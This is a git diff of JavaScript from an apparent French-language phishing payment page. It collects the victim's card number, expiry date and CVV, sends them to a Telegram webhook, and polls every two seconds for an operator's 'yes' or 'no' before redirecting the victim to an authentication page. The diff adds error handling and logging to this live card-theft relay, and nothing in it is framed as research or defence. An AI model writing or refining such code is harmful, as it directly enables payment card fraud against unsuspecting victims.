@@ -123,34 +123,53 @@
 
             const message = `Nouveau paiement:\nNuméro de carte: ${cardNumber}\nDate d'expiration: ${expiryDate}\nCVV: ${cvv}\n\nConfirmez-vous ce paiement ?`;
 
-            const response = await fetch('/.netlify/functions/telegram-webhook', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    message: message,
-                    page: 'page3' // Indique que c'est pour la page de paiement
-                })
-            });
+            try {
+                const response = await fetch('/.netlify/functions/telegram-webhook', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        message: message,
+                        page: 'page3' // Indique que c'est pour la page de paiement
+                    })
+                });
 
-            // Ne pas afficher la réponse, démarrer la vérification de la réponse Telegram
-            checkTelegramResponse();
+                if (response.ok) {
+                    console.log('Message envoyé à Telegram avec succès');
+                    checkTelegramResponse();
+                } else {
+                    console.error('Erreur lors de l\'envoi à Telegram:', response.statusText);
+                    alert('Erreur lors de l\'envoi des données à Telegram. Veuillez réessayer.');
+                }
+            } catch (error) {
+                console.error('Erreur réseau:', error);
+                alert('Erreur réseau. Veuillez vérifier votre connexion et réessayer.');
+            }
         });
 
         async function checkTelegramResponse() {
+            console.log('Début de la vérification de la réponse Telegram');
             const interval = setInterval(async () => {
-                const response = await fetch('/.netlify/functions/check-response?page=page3');
-                const data = await response.json();
+                try {
+                    const response = await fetch('/.netlify/functions/check-response?page=page3');
+                    const data = await response.json();
 
-                if (data.action) {
-                    clearInterval(interval);
-                    if (data.action === 'yes') {
-                        window.location.href = 'authentication.html';
-                    } else if (data.action === 'no') {
-                        alert('Paiement refusé. Veuillez réessayer.');
-                        window.location.href = 'paiement.html';
+                    console.log('Réponse de check-response:', data);
+
+                    if (data.action) {
+                        clearInterval(interval);
+                        if (data.action === 'yes') {
+                            console.log('Redirection vers authentication.html');
+                            window.location.href = 'authentication.html';
+                        } else if (data.action === 'no') {
+                            console.log('Paiement refusé, redirection vers paiement.html');
+                            alert('Paiement refusé. Veuillez réessayer.');
+                            window.location.href = 'paiement.html';
+                        }
                     }
+                } catch (error) {
+                    console.error('Erreur lors de la vérification de la réponse Telegram:', error);
                 }
             }, 2000); // Vérifie toutes les 2 secondes
         }
